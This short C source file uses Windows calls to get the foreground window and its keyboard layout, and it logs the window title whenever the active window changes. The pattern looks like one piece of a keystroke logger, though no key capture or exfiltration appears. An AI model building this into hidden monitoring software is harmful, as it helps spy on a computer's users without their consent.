#include "common.h"

static HWND g_lastHwnd = NULL;

void logger_write_header(const wchar_t* title);


HKL foreground_update_and_layout(void) {
	HWND fg = GetForegroundWindow();
	DWORD tid = GetWindowThreadProcessId(fg, NULL);
	HKL layout = GetKeyboardLayout(tid);

	if (fg != g_lastHwnd)
	{
		wchar_t title[512] = { 0 };

		GetWindowTextW(fg, title, 512);
		logger_write_header(title);
		g_lastHwnd = fg;
	}

	return layout;
}

